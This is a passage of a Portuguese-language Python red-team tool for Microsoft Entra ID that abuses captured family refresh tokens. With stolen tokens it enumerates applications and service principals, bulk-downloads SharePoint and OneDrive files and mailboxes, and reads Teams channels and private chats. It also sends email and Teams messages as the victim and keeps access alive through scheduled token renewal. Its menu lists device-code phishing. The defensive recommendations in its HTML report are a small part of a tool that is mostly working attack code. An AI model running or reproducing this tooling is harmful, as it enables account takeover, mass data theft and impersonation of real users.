        save_json(Config.DATA_DIR/"service_principals.json", sps)
        log.ok(f"Salvo: {Config.DATA_DIR/'service_principals.json'}")
        RunMode.emit({"action":"service_principals","count":len(sps)}); return sps

    def aplicacoes_registradas(self):
        print("\n[39] APPLICATIONS REGISTRADAS\n")
        at = self._at()
        if not at: return
        apps = graph_get_all("/applications", at, params={
            "$select":"displayName,appId,createdDateTime,passwordCredentials,keyCredentials",
            "$top":100})
        if not apps: log.warn("Sem resultados (requer Application.Read.All)."); return
        log.ok(f"{len(apps)} applications"); now = _now(); print()
        for app in apps[:20]:
            name    = app.get("displayName","N/A"); created = app.get("createdDateTime","")[:10]
            secrets = app.get("passwordCredentials",[]); certs = app.get("keyCredentials",[])
            expired = []
            for s in secrets:
                exp_s = s.get("endDateTime","")
                if exp_s:
                    try:
                        if now > datetime.fromisoformat(exp_s.replace("Z","")): expired.append(s.get("displayName","secret"))
                    except Exception: pass
            flag = "  \033[91m⚠ SECRET EXPIRADO\033[0m" if expired else ""
            print(f"  🔐 {name:<40} criado: {created}{flag}")
            print(f"     {app.get('appId','')}  secrets:{len(secrets)}  certs:{len(certs)}")
            print()
        if len(apps)>20: print(f"  ... (+{len(apps)-20} mais)")
        save_json(Config.DATA_DIR/"applications.json", apps)
        log.ok(f"Salvo: {Config.DATA_DIR/'applications.json'}")
        RunMode.emit({"action":"applications","count":len(apps)}); return apps


# ═══ SHAREPOINT — melhoria #5 ════════════════════════════════════════════════
class SharePointModule:
    def __init__(self, tm: TokenManager):
        self.tm = tm
        self.dl_dir = Config.BASE_DIR / "downloads" / "sharepoint"
        self.dl_dir.mkdir(parents=True, exist_ok=True)

    def _at(self) -> Optional[str]:
        at = self.tm.get_active_token() or self.tm.vault.get_best_at()
        if not at: log.error("Sem token ativo.")
        return at

    def listar_sites(self):
        print("\n[70] SHAREPOINT — LISTAR SITES\n")
        at = self._at()
        if not at: return
        sites = graph_get_all("/sites", at, params={
            "$select":"id,displayName,webUrl,createdDateTime","search":"*"})
        if not sites: log.warn("Sem sites (requer Sites.Read.All)."); return
        log.ok(f"{len(sites)} sites"); print()
        for s in sites:
            print(f"  🌐 {s.get('displayName',''):<40}")
            print(f"     URL: {s.get('webUrl','')}")
            print(f"     ID : {s.get('id','')}\n")
        save_json(Config.DATA_DIR/"sharepoint_sites.json", sites)
        log.ok(f"Salvo: {Config.DATA_DIR/'sharepoint_sites.json'}"); return sites

    def listar_arquivos_site(self):
        print("\n[71] SHAREPOINT — ARQUIVOS DO SITE\n")
        at = self._at()
        if not at: return
        sites = load_json(Config.DATA_DIR/"sharepoint_sites.json")
        if not sites: log.warn("Execute Opção 70 primeiro."); return
        for i, s in enumerate(sites, 1): print(f"  [{i}] {s.get('displayName','')}")
        print()
        try: site = sites[int(input("  Site [1]: ").strip() or "1")-1]
        except (ValueError, IndexError): log.error("Inválido."); return
        drives_r = graph_get(f"/sites/{site['id']}/drives", at)
        if not drives_r: return
        drives = drives_r.get("value",[])
        for i, d in enumerate(drives, 1): print(f"  [{i}] {d.get('name','')} — {d.get('driveType','')}")
        print()
        try: drive = drives[int(input("  Drive [1]: ").strip() or "1")-1]
        except (ValueError, IndexError): log.error("Inválido."); return
        items = graph_get_all(f"/drives/{drive['id']}/root/children", at, params={
            "$select":"name,size,file,folder,lastModifiedDateTime","$top":200})
        log.ok(f"{len(items)} itens")
        for item in items:
            tipo = "📁" if "folder" in item else "📄"
            size = f"{item.get('size',0)//1024} KB" if item.get("size") else ""
            print(f"  {tipo} {item.get('name',''):<45} {size}")
        out = Config.DATA_DIR / f"sp_files_{site.get('displayName','site')}.json"
        save_json(out, items); log.ok(f"Salvo: {out}"); return items

    def baixar_arquivo_sharepoint(self):
        print("\n[72] SHAREPOINT — BAIXAR ARQUIVO\n")
        at = self._at()
        if not at: return
        site_id = input("  Site ID (de Opção 70): ").strip()
        caminho = input("  Caminho (ex: Documentos/relatorio.pdf): ").strip()
        if not site_id or not caminho: log.error("Site ID e caminho obrigatórios."); return
        enc  = requests.utils.quote(caminho)
        info = graph_get(f"/sites/{site_id}/drive/root:/{enc}", at,
                         params={"$select":"id,name,size,@microsoft.graph.downloadUrl"})
        if not info: return
        dl_url = info.get("@microsoft.graph.downloadUrl")
        if not dl_url: log.error("URL indisponível."); return
        nome = info.get("name","arquivo"); out = self.dl_dir / nome
        log.info(f"Baixando: {nome} ({info.get('size',0)//1024} KB)")
        try:
            with requests.get(dl_url, stream=True, timeout=60) as r:
                r.raise_for_status()
                with open(out, "wb") as f:
                    for chunk in r.iter_content(65536): f.write(chunk)
            log.ok(f"Salvo: {out}")
        except Exception as e: log.error(f"Erro: {e}")


# ═══ FASE 4 — PERSISTÊNCIA ════════════════════════════════════════════════════
class PersistenceModule:
    def __init__(self, tm: TokenManager, renewer: BackgroundRenewer = None):
        self.tm = tm; self.renewer = renewer
        self._sf = Config.DATA_DIR / "persistence_status.json"

    def configurar_renovacao(self):
        print("\n[40] CONFIGURAR RENOVAÇÃO AUTOMÁTICA\n")
        if not self.tm.get_active_data(): log.error("Sem token ativo."); return
        interval_h = int(input("  Intervalo em horas [24]: ").strip() or "24")
        bg = input("  Ativar background thread agora? (S/n): ").strip().lower()
        if bg != "n" and self.renewer:
            self.renewer.start()
        status = {
            "enabled": True, "interval_h": interval_h, "background_active": bg != "n",
            "last_renewal": _now().isoformat()+"Z",
            "next_renewal": (_now()+timedelta(hours=interval_h)).isoformat()+"Z",
            "active_label": self.tm._active_label,
        }
        save_json(self._sf, status)
        log.ok(f"Configurado: a cada {interval_h}h")
        log.info(f"Próxima: {status['next_renewal']}")
        print(f"\n  Cron job: 0 */{interval_h} * * * python3 ~/.frt_suite/frt_red_team_suite.py --renew\n")

    def status_persistencia(self):
        print("\n[41] STATUS DE PERSISTÊNCIA\n")
        s = load_json(self._sf)
        if not s: log.warn("Não configurado. Execute Opção 40."); return
        print(f"  Ativa     : {'✅' if s.get('enabled') else '❌'}")
        print(f"  Background: {'✅ Rodando' if s.get('background_active') and self.renewer and self.renewer._t.is_alive() else '❌'}")
        print(f"  Intervalo : {s.get('interval_h','?')}h")
        print(f"  Última    : {s.get('last_renewal','?')}")
        print(f"  Próxima   : {s.get('next_renewal','?')}")
        try:
            if _now() > datetime.fromisoformat(s.get("next_renewal","").replace("Z","")):
                log.warn("Renovação pendente — execute Opção 3")
        except Exception: pass

    def criar_dispositivo_virtual(self):
        print("\n[42] DISPOSITIVO VIRTUAL (PRT)\n")
        print("  PRT via registro de dispositivo eleva nível de persistência.")
        print("  Client ID Intune: 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223")
        print("  Ref: https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/\n")


# ═══ AÇÕES ATIVAS (60-66) ════════════════════════════════════════════════════
class AcoesAtivasModule:
    def __init__(self, tm: TokenManager):
        self.tm = tm
        self.dl_dir = Config.BASE_DIR / "downloads"
        self.dl_dir.mkdir(parents=True, exist_ok=True)

    def _at(self, prefer: str = None) -> Optional[str]:
        at = (self.tm.vault.get_at(prefer) if prefer else None)              or self.tm.get_active_token() or self.tm.vault.get_best_at()
        if not at: log.error("Sem token. Use Op.1 ou Op.10.")
        return at

    def enviar_email(self):
        print("\n[60] ENVIAR EMAIL\n")
        at = self._at(prefer="27922004-5251-4030-b22d-91ecd9a37ea4")
        if not at: return
        to = input("  Para: ").strip()
        if not to: log.error("Destinatário obrigatório."); return
        subj = input("  Assunto: ").strip() or "(sem assunto)"
        print("  Corpo (linha vazia dupla finaliza):")
        lines = []
        while True:
            ln = input()
            if ln == "" and lines and lines[-1] == "": break
            lines.append(ln)
        body = "\n".join(lines).strip()
        html = input("  Enviar como HTML? (s/N): ").strip().lower() == "s"
        r = graph_post("/me/sendMail", at, {
            "message": {"subject": subj,
                        "body": {"contentType": "HTML" if html else "Text", "content": body},
                        "toRecipients": [{"emailAddress": {"address": to}}]},
            "saveToSentItems": True})
        if r and r.status_code == 202: log.ok(f"Enviado para {to}!")
        elif r and r.status_code == 403: log.error("403 — Mail.Send negado.")
        elif r: log.error(f"Falha [{r.status_code}]: {r.text[:200]}")

    def baixar_emails(self):
        print("\n[61] BAIXAR EMAILS\n")
        at = self._at()
        if not at: return
        fmt   = input("  [1] JSON  [2] EML (Enter=1): ").strip() or "1"
        limit = int(input("  Quantidade [20]: ").strip() or "20")
        pasta = input("  Pasta [inbox]: ").strip() or "inbox"
        r = graph_get(f"/me/mailFolders/{pasta}/messages", at, params={
            "$select":"id,subject,from,receivedDateTime,body,bodyPreview",
            "$top":min(limit,50), "$orderby":"receivedDateTime DESC"})
        if not r: return
        emails = r.get("value",[]); log.ok(f"{len(emails)} emails")
        out_dir = self.dl_dir / "emails"; out_dir.mkdir(exist_ok=True)
        salvos = 0
        for msg in emails:
            mid = msg.get("id","x"); subj = msg.get("subject","sem_assunto")
            safe = "".join(c if c.isalnum() or c in " -_" else "_" for c in subj)[:60]
            ts   = msg.get("receivedDateTime","")[:10]
            if fmt == "2":
                try:
                    rr = requests.get(f"{Config.GRAPH_BASE}/me/messages/{mid}/$value",
                                      headers={"Authorization":f"Bearer {at}"}, timeout=20)
                    if rr.status_code == 200: (out_dir/f"{ts}_{safe}.eml").write_bytes(rr.content); salvos+=1
                    else: log.warn(f"EML [{rr.status_code}]: {safe}")
                except Exception as e: log.warn(str(e))
            else:
                save_json(out_dir/f"{ts}_{safe}.json", msg); salvos+=1
            sys.stdout.write(f"\r  Salvando: {salvos}/{len(emails)}"); sys.stdout.flush()
            time.sleep(0.3)
        print(); log.ok(f"{salvos} email(s) em: {out_dir}")

    def enviar_mensagem_teams(self):
        print("\n[62] ENVIAR MENSAGEM NO TEAMS (CANAL)\n")
        at = self._at(prefer="1fec8e78-bce4-4aaf-ab1b-5451cc387264")
        if not at: return
        teams = (graph_get("/me/joinedTeams", at) or {}).get("value",[])
        if not teams: log.warn("Nenhum Team."); return
        for i, t in enumerate(teams, 1): print(f"  [{i}] {t.get('displayName','')}")
        try: team = teams[int(input("\n  Team [1]: ").strip() or "1")-1]
        except (ValueError,IndexError): log.error("Inválido."); return
        channels = (graph_get(f"/teams/{team['id']}/channels", at) or {}).get("value",[])
        for i, c in enumerate(channels, 1): print(f"  [{i}] {c.get('displayName','')}")
        try: ch = channels[int(input("\n  Canal [1]: ").strip() or "1")-1]
        except (ValueError,IndexError): log.error("Inválido."); return
        msg = input("\n  Mensagem: ").strip()
        if not msg: log.error("Vazia."); return
        r = graph_post(f"/teams/{team['id']}/channels/{ch['id']}/messages", at,
                       {"body":{"contentType":"text","content":msg}})
        if r and r.status_code == 201: log.ok(f"Enviado em #{ch.get('displayName')}!")
        elif r and r.status_code == 403: log.error("403 — ChannelMessage.Send negado.")
        elif r: log.error(f"Falha [{r.status_code}]: {r.text[:200]}")

    def ver_mensagens_teams(self):
        print("\n[63] VER MENSAGENS DO TEAMS\n")
        at = self._at(prefer="1fec8e78-bce4-4aaf-ab1b-5451cc387264")
        if not at: return
        print("  [1] Canal  [2] Chat/DM")
        if (input("\n  Modo [1]: ").strip() or "1") == "1": self._canal(at)
        else: self._chats(at)

    def _canal(self, at: str):
        teams = (graph_get("/me/joinedTeams", at) or {}).get("value",[])
        for i,t in enumerate(teams,1): print(f"  [{i}] {t.get('displayName')}")
        try: team = teams[int(input("\n  Team [1]: ").strip() or "1")-1]
        except (ValueError,IndexError): log.error("Inválido."); return
        chs = (graph_get(f"/teams/{team['id']}/channels", at) or {}).get("value",[])
        for i,c in enumerate(chs,1): print(f"  [{i}] {c.get('displayName')}")
        try: ch = chs[int(input("\n  Canal [1]: ").strip() or "1")-1]
        except (ValueError,IndexError): log.error("Inválido."); return
        limit = int(input("  Mensagens? [20]: ").strip() or "20")
        r = graph_get(f"/teams/{team['id']}/channels/{ch['id']}/messages", at, params={"$top":min(limit,50)})
        if not r: return
        msgs = r.get("value",[]); log.ok(f"{len(msgs)} mensagens"); print()
        for m in reversed(msgs):
            user = ((m.get("from") or {}).get("user") or {}).get("displayName","Sistema")
            ts   = m.get("createdDateTime","")[:19].replace("T"," ")
            body = re.sub(r"<[^>]+>","", (m.get("body") or {}).get("content","")).strip()[:200]
            print(f"  \033[96m{user}\033[0m  \033[90m{ts}\033[0m\n  {body}\n")
        out = Config.DATA_DIR / f"teams_canal_{ch.get('displayName','')}.json"
        save_json(out, msgs); log.ok(f"Salvo: {out}")

    def _chats(self, at: str):
        r = graph_get("/me/chats", at, params={"$expand":"members","$top":20})
        if not r: return
        chats = r.get("value",[])
        if not chats: log.warn("Sem chats (requer Chat.Read)."); return
        for i,c in enumerate(chats,1):
            names = [m.get("displayName","?") for m in c.get("members",[]) if m.get("displayName")]
            print(f"  [{i}] {', '.join(names[:3]) or c.get('chatType','chat')}")
        try: chat = chats[int(input("\n  Chat [1]: ").strip() or "1")-1]
        except (ValueError,IndexError): log.error("Inválido."); return
        limit = int(input("  Mensagens? [20]: ").strip() or "20")
        mr = graph_get(f"/me/chats/{chat['id']}/messages", at, params={"$top":min(limit,50)})
        if not mr: return
        msgs = mr.get("value",[]); log.ok(f"{len(msgs)} mensagens"); print()
        for m in reversed(msgs):
            user = ((m.get("from") or {}).get("user") or {}).get("displayName","Sistema")
            ts   = m.get("createdDateTime","")[:19].replace("T"," ")
            body = re.sub(r"<[^>]+>","", (m.get("body") or {}).get("content","")).strip()[:200]
            print(f"  \033[96m{user}\033[0m  \033[90m{ts}\033[0m\n  {body}\n")
        save_json(Config.DATA_DIR/"teams_dm_messages.json", msgs)
        log.ok(f"Salvo: {Config.DATA_DIR/'teams_dm_messages.json'}")

    def enviar_dm_teams(self):
        """Opção 64 — DM direto para um usuário — melhoria #4"""
        print("\n[64] ENVIAR DM DIRETO NO TEAMS\n")
        at = self._at(prefer="1fec8e78-bce4-4aaf-ab1b-5451cc387264")
        if not at: return
        dest_email = input("  Email do destinatário: ").strip()
        if not dest_email: log.error("Email obrigatório."); return
        log.info(f"Resolvendo userId para {dest_email}...")
        ui = graph_get(f"/users/{dest_email}", at, params={"$select":"id,displayName"})
        if not ui: log.error("Usuário não encontrado."); return
        dest_id = ui["id"]; dest_name = ui.get("displayName", dest_email)
        me = graph_get("/me", at, params={"$select":"id"})
        if not me: return
        my_id = me["id"]
        log.info(f"Criando chat com {dest_name}...")
        cp = {"chatType":"oneOnOne","members":[
            {"@odata.type":"#microsoft.graph.aadUserConversationMember","roles":["owner"],
             "user@odata.bind":f"https://graph.microsoft.com/v1.0/users/{my_id}"},
            {"@odata.type":"#microsoft.graph.aadUserConversationMember","roles":["owner"],
             "user@odata.bind":f"https://graph.microsoft.com/v1.0/users/{dest_id}"}]}
        r = graph_post("/chats", at, cp)
        if not r or r.status_code not in (200,201):
            log.error(f"Falha ao criar chat [{r.status_code if r else 'N/A'}]"); return
        chat_id = r.json().get("id")
        msg = input(f"\n  Mensagem para {dest_name}: ").strip()
        if not msg: log.error("Vazia."); return
        r2 = graph_post(f"/chats/{chat_id}/messages", at, {"body":{"contentType":"text","content":msg}})
        if r2 and r2.status_code == 201: log.ok(f"DM enviada para {dest_name}!")
        elif r2 and r2.status_code == 403: log.error("403 — Chat.ReadWrite necessário.")
        elif r2: log.error(f"Falha [{r2.status_code}]: {r2.text[:200]}")

    def baixar_arquivo_onedrive(self):
        print("\n[65] BAIXAR ARQUIVO DO ONEDRIVE\n")
        at = self._at()
        if not at: return
        r = graph_get("/me/drive/root/children", at, params={
            "$select":"id,name,size,file,folder","$top":100})
        if not r: return
        files = [i for i in r.get("value",[]) if "file" in i]
        if files:
            for i,f in enumerate(files,1):
                print(f"  [{i:2}] {f.get('name',''):<45} {f.get('size',0)//1024:>6} KB")
        print("\n  [N] Número  [P] Caminho manual")
        modo = input("  Escolha: ").strip().upper()
        if modo == "P" or not files:
            cam = input("  Caminho: ").strip()
            if not cam: return
            info = graph_get(f"/me/drive/root:/{requests.utils.quote(cam)}", at,
                             params={"$select":"id,name,size,file"})
            if not info or "folder" in info: log.error("Inválido ou pasta."); return
            self._dl(at, info["id"], info.get("name","arquivo"))
        else:
            try: self._dl(at, files[int(modo)-1]["id"], files[int(modo)-1].get("name","arquivo"))
            except (ValueError,IndexError): log.error("Inválido.")

    def _dl(self, at: str, item_id: str, nome: str):
        info = graph_get(f"/me/drive/items/{item_id}", at,
                         params={"$select":"id,name,size,@microsoft.graph.downloadUrl"})
        if not info: return
        dl = info.get("@microsoft.graph.downloadUrl")
        if not dl: log.error("URL indisponível."); return
        size = info.get("size",0); out = self.dl_dir / "onedrive" / nome
        out.parent.mkdir(parents=True, exist_ok=True)
        log.info(f"Baixando: {nome} ({size//1024} KB)")
        try:
            with requests.get(dl, stream=True, timeout=60) as r:
                r.raise_for_status(); done = 0
                with open(out,"wb") as f:
                    for chunk in r.iter_content(65536):
                        f.write(chunk); done += len(chunk)
                        if size > 0:
                            sys.stdout.write(f"\r  {done*100//size}% ({done//1024} KB)")
                            sys.stdout.flush()
            print(); log.ok(f"Salvo: {out}")
        except Exception as e: log.error(f"Erro: {e}")

    def download_lote_onedrive(self):
        print("\n[66] DOWNLOAD EM LOTE — ONEDRIVE\n")
        at = self._at()
        if not at: return
        pasta  = input("  Pasta de origem [raiz]: ").strip() or ""
        exts   = input("  Extensões (.pdf .docx — Enter=tudo): ").strip().lower()
        extset = [e.strip() for e in exts.split() if e.strip()] if exts else []
        maxf   = int(input("  Máx. arquivos [100]: ").strip() or "100")
        out_dir = self.dl_dir / "onedrive_lote"; out_dir.mkdir(parents=True, exist_ok=True)
        log.info("Varredura recursiva..."); baixados=[0]; erros=[0]

        def listar(iid: str, local: Path):
            ep = (f"/me/drive/items/{iid}/children" if iid else "/me/drive/root/children")
            items = graph_get_all(ep, at, params={"$top":200,"$select":"id,name,size,file,folder"})
            for item in items:
                nome = item.get("name","x")
                if "folder" in item:
                    sub = local/nome; sub.mkdir(exist_ok=True)
                    log.info(f"📁 {sub.relative_to(out_dir)}"); listar(item["id"], sub)
                elif "file" in item:
                    if baixados[0] >= maxf: return
                    if extset and not any(nome.lower().endswith(e) for e in extset): continue
                    info = graph_get(f"/me/drive/items/{item['id']}", at,
                                     params={"$select":"id,name,size,@microsoft.graph.downloadUrl"})
                    dl = (info or {}).get("@microsoft.graph.downloadUrl")
                    if not dl: erros[0]+=1; continue
                    try:
                        with requests.get(dl, stream=True, timeout=60) as r:
                            r.raise_for_status()
                            with open(local/nome,"wb") as f:
                                for chunk in r.iter_content(65536): f.write(chunk)
                        baixados[0]+=1
                        sys.stdout.write(f"\r  [{baixados[0]:3}/{maxf}] {nome[:50]:<50} {item.get('size',0)//1024:>6} KB")
                        sys.stdout.flush()
                    except Exception as e: log.warn(f"Erro {nome}: {e}"); erros[0]+=1
                    time.sleep(0.2)

        raiz_id = None
        if pasta:
            info = graph_get(f"/me/drive/root:/{requests.utils.quote(pasta)}", at, params={"$select":"id,name"})
            if not info: return
            raiz_id = info["id"]
        listar(raiz_id, out_dir)
        print(); log.ok(f"Concluído: {baixados[0]} arquivo(s), {erros[0]} erro(s) → {out_dir}")


# ═══ RELATÓRIOS — melhoria #9 (HTML rico) ════════════════════════════════════
class UtilsModule:

    @staticmethod
    def gerar_relatorio():
        print("\n[50] GERAR RELATÓRIO\n")
        files = {
            "users": Config.DATA_DIR/"users_enum.json",
            "admins": Config.DATA_DIR/"admins_enum.json",
            "emails": Config.DATA_DIR/"emails_read.json",
            "onedrive": Config.DATA_DIR/"onedrive_files.json",
            "teams": Config.DATA_DIR/"teams_enum.json",
            "frt": Config.DATA_DIR/"frt_analysis.json",
            "calendar": Config.DATA_DIR/"calendar_events.json",
            "contacts": Config.DATA_DIR/"contacts.json",
            "svc_principals": Config.DATA_DIR/"service_principals.json",
            "applications": Config.DATA_DIR/"applications.json",
            "sp_sites": Config.DATA_DIR/"sharepoint_sites.json",
        }
        report = {"generated_at": _now().isoformat()+"Z", "tenant": Config.TENANT_DOM,
                  "summary": {}, "data": {}}
        for key, path in files.items():
            c = load_json(path)
            if c is not None:
                report["summary"][key] = len(c) if isinstance(c, (list,dict)) else 1
                report["data"][key] = c
        save_json(Config.REPORT_FILE, report)
        log.ok(f"JSON: {Config.REPORT_FILE}")
        html_path = UtilsModule._html_rico(report)
        if html_path: log.ok(f"HTML: {html_path}")
        RunMode.emit({"action":"report","summary":report["summary"]})
        print("\n  Resumo:")
        for k, v in report["summary"].items(): print(f"  - {k:<18}: {v} item(s)")

    @staticmethod
    def _html_rico(report: Dict) -> Optional[Path]:
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        out = Config.REPORTS_DIR / f"report_{ts}.html"
        s   = report.get("summary", {}); d = report.get("data", {})

        # Admins rows
        ar = ""
        for role, members in (d.get("admins") or {}).items():
            for m in members:
                ar += f"<tr><td>{role}</td><td>{m.get('displayName','')}</td><td>{m.get('upn','')}</td></tr>"

        # Users rows (top 50)
        ur = ""
        for u in (d.get("users") or [])[:50]:
            ur += (f"<tr><td>{u.get('displayName','')}</td><td>{u.get('userPrincipalName','')}</td>"
                   f"<td>{u.get('jobTitle','')}</td><td>{u.get('department','')}</td></tr>")

        # FRT rows
        fr = ""
        for name, info in (d.get("frt") or {}).items():
            st = info.get("status","?")
            icon = "✅" if st=="available" else ("⚠️" if "interaction" in st else "❌")
            fr += f"<tr><td>{name}</td><td>{icon} {st}</td><td>{info.get('client_id','')}</td></tr>"

        # Service Principals rows (top 30)
        spr = ""
        for sp in (d.get("svc_principals") or [])[:30]:
            spr += (f"<tr><td>{sp.get('displayName','')}</td><td>{sp.get('servicePrincipalType','')}</td>"
                    f"<td>{sp.get('publisherName','')}</td><td>{sp.get('appId','')}</td></tr>")

        # IoCs
        ioc = ""
        admin_count = sum(len(v) for v in (d.get("admins") or {}).values())
        if admin_count: ioc += f"<li>🔴 {admin_count} Global Admin(s) identificado(s)</li>"
        if d.get("emails"): ioc += f"<li>🟠 {len(d['emails'])} emails lidos sem interação</li>"
        if d.get("frt"):
            avail = sum(1 for v in d["frt"].values() if v.get("status")=="available")
            if avail: ioc += f"<li>🔴 FRT válido para {avail} aplicações FOCI</li>"
        if d.get("applications"):
            now = _now(); exp_count = 0
            for app in d["applications"]:
                for sec in app.get("passwordCredentials",[]):
                    try:
                        if now > datetime.fromisoformat(sec.get("endDateTime","").replace("Z","")): exp_count+=1
                    except Exception: pass
            if exp_count: ioc += f"<li>🟡 {exp_count} client secret(s) expirado(s)</li>"
        if not ioc: ioc = "<li>Nenhum IoC crítico identificado</li>"

        # Summary cards
        cards = ""
        for key, (icon, label) in [
            ("users","👥Usuários"),("admins","⚠️Admins"),("emails","📧Emails"),
            ("onedrive","📁OneDrive"),("frt","🔑FOCI Apps"),("contacts","👤Contatos"),
            ("calendar","📅Eventos"),("svc_principals","🤖SvcPrincipals"),
        ]:
            icon_part, label_part = icon, label
            val = s.get(key, 0)
            cards += f'''<div class="card"><div class="ci">{icon_part}</div>
            <div class="cv">{val}</div><div class="cl">{label_part}</div></div>'''

        html = f"""<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8">
<title>FRT Report — {Config.TENANT_DOM}</title>
<style>
:root{{--bg:#0d0d0d;--bg2:#111;--bg3:#1a1a1a;--red:#ff4444;--green:#00ff88;--gold:#ffaa00;--border:#2a2a2a}}
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Segoe UI',monospace;background:var(--bg);color:var(--green);padding:2em}}
h1{{color:var(--red);font-size:1.8em;margin-bottom:.3em}}
h2{{color:var(--gold);border-bottom:1px solid var(--border);padding-bottom:.4em;margin:1.5em 0 .8em}}
.meta{{color:#555;font-size:.85em;margin-bottom:1.5em}}
.cards{{display:flex;flex-wrap:wrap;gap:1em;margin-bottom:2em}}
.card{{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:1em;min-width:120px;text-align:center}}
.ci{{font-size:1.8em}}.cv{{font-size:2em;font-weight:bold;color:var(--gold)}}.cl{{font-size:.75em;color:#888;margin-top:.3em}}
table{{width:100%;border-collapse:collapse;margin-bottom:1.5em;font-size:.85em}}
th,td{{border:1px solid var(--border);padding:6px 10px;text-align:left}}
th{{background:var(--bg3);color:var(--gold)}}tr:nth-child(even){{background:var(--bg2)}}
.search{{background:var(--bg3);border:1px solid var(--border);color:var(--green);
  padding:.4em .8em;border-radius:4px;margin-bottom:.8em;width:300px}}
.ioc{{background:#1a0000;border-left:4px solid var(--red);padding:1em;border-radius:4px;margin-bottom:1.5em}}
.ioc li{{margin:.4em 0}}
.ok{{color:#00ff88}}.warn{{color:#ffaa00}}.err{{color:#ff4444}}
footer{{color:#333;font-size:.75em;margin-top:2em;border-top:1px solid var(--border);padding-top:1em}}
</style>
<script>
function ft(si,ti){{const q=document.getElementById(si).value.toLowerCase();
document.querySelectorAll('#'+ti+' tbody tr').forEach(r=>{{r.style.display=r.textContent.toLowerCase().includes(q)?'':' none'}})}}
</script></head><body>
<h1>🔴 FRT Red Team Report</h1>
<div class="meta">Tenant: <strong>{Config.TENANT_DOM}</strong> | Gerado: {report.get('generated_at','')} | FRT Suite v1.2</div>
<div class="cards">{cards}</div>
<h2>⚠️ Indicadores de Comprometimento (IoCs)</h2>
<ul class="ioc">{ioc}</ul>
<h2>🔑 Análise FRT / FOCI</h2>
<table id="frt-t"><thead><tr><th>Aplicação</th><th>Status</th><th>Client ID</th></tr></thead>
<tbody>{fr or '<tr><td colspan=3>Sem dados — execute Opção 20</td></tr>'}</tbody></table>
<h2>⚠️ Global Admins Identificados</h2>
<table><thead><tr><th>Role</th><th>Nome</th><th>UPN</th></tr></thead>
<tbody>{ar or '<tr><td colspan=3>Sem dados</td></tr>'}</tbody></table>
<h2>👥 Usuários ({s.get('users',0)} total — até 50)</h2>
<input class="search" id="us" placeholder="🔍 Filtrar..." oninput="ft('us','ut')">
<table id="ut"><thead><tr><th>Nome</th><th>UPN</th><th>Cargo</th><th>Depto</th></tr></thead>
<tbody>{ur or '<tr><td colspan=4>Sem dados — execute Opção 30</td></tr>'}</tbody></table>
<h2>🤖 Service Principals ({s.get('svc_principals',0)} — até 30)</h2>
<input class="search" id="ss" placeholder="🔍 Filtrar..." oninput="ft('ss','spt')">
<table id="spt"><thead><tr><th>Nome</th><th>Tipo</th><th>Publisher</th><th>App ID</th></tr></thead>
<tbody>{spr or '<tr><td colspan=4>Sem dados — execute Opção 38</td></tr>'}</tbody></table>
<h2>📋 Recomendações de Defesa</h2>
<table><thead><tr><th>#</th><th>Controle</th><th>Prioridade</th></tr></thead><tbody>
<tr><td>1</td><td>Bloquear Device Code Flow via Conditional Access</td><td class="err">CRÍTICO</td></tr>
<tr><td>2</td><td>MFA obrigatório para todos os usuários</td><td class="err">CRÍTICO</td></tr>
<tr><td>3</td><td>Revogar Refresh Tokens (Revoke-AzureADUserAllRefreshToken)</td><td class="err">CRÍTICO</td></tr>
<tr><td>4</td><td>Monitorar com KQL — DeviceCodeFlow, TokenMinting</td><td class="warn">ALTO</td></tr>
<tr><td>5</td><td>Implementar Continuous Access Evaluation (CAE)</td><td class="warn">ALTO</td></tr>
<tr><td>6</td><td>Restringir FOCI via App Protection Policies</td><td class="warn">ALTO</td></tr>
<tr><td>7</td><td>Auditar service principals com secrets expirados</td><td class="ok">MÉDIO</td></tr>
<tr><td>8</td><td>Implementar Zero Trust Architecture</td><td class="ok">MÉDIO</td></tr>
</tbody></table>
<footer>FRT Red Team Suite v1.2 | {Config.TENANT_DOM} | {report.get('generated_at','')}</footer>
</body></html>"""
        try:
            out.write_text(html, encoding="utf-8"); return out
        except Exception as e:
            log.error(f"HTML: {e}"); return None

    @staticmethod
    def ver_logs(linhas: int = 30):
        print(f"\n[51] LOG (últimas {linhas} linhas)\n")
        if not Config.LOG_FILE.exists(): log.warn("Nenhum log."); return
        with open(Config.LOG_FILE, encoding="utf-8") as f: lines = f.readlines()
        for l in lines[-linhas:]: print(l.rstrip())
        sessions = sorted(Config.LOGS_DIR.glob("session_*.log"), reverse=True)
        if sessions:
            print(f"\n  Sessões disponíveis ({len(sessions)}):")
            for s in sessions[:5]: print(f"  - {s.name}")
            ver = input("\n  Ver sessão? (nome ou Enter para pular): ").strip()
            if ver:
                sf = Config.LOGS_DIR / ver
                if sf.exists():
                    with open(sf, encoding="utf-8") as f: print(f.read())
                else: log.warn("Não encontrado.")

    @staticmethod
    def limpar_dados():
        print("\n[52] LIMPAR DADOS\n")
        if input("  ⚠  Remove dados (preserva tokens). Confirmar? (s/N): ").lower() != "s":
            print("  Cancelado."); return
        protegidos = {"tokens.json","token_vault.json","persistence_status.json"}
        removidos = 0
        for f in Config.DATA_DIR.glob("*.json"):
            if f.name not in protegidos: f.unlink(); print(f"  Removido: {f.name}"); removidos+=1
        log.ok(f"{removidos} arquivo(s) removido(s). Tokens preservados.")


# ═══ MENU PRINCIPAL ═══════════════════════════════════════════════════════════
BANNER = """
╔═════════════════════════════════════════════════════════════════════════╗
║          🔐 FRT RED TEAM SUITE v1.2 — yourdomain.com                ║
║   Family Refresh Token Attack Chain | Microsoft Entra ID / Azure AD   ║
╚═════════════════════════════════════════════════════════════════════════╝
"""

MENU_TEXTO = """
  ── TOKENS ──────────────────────────────────────────────────────────────
  [1]  Carregar tokens           [2]  Listar tokens + Vault
  [3]  Renovar access token      [4]  Validar tokens
  [5]  Backup dos tokens

  ── FASE 1: CAPTURA ──────────────────────────────────────────────────────
  [10] Device Code Flow REAL     [11] Gerar URL phishing manual

  ── FASE 2: ANÁLISE FRT ──────────────────────────────────────────────────
  [20] Analisar FRT + popular Vault    [21] Ver análise anterior

  ── FASE 3: EXPLORAÇÃO ───────────────────────────────────────────────────
  [30] Enumerar usuários (paginação)   [31] Encontrar Global Admins
  [32] Ler emails                      [33] Listar OneDrive (paginação)
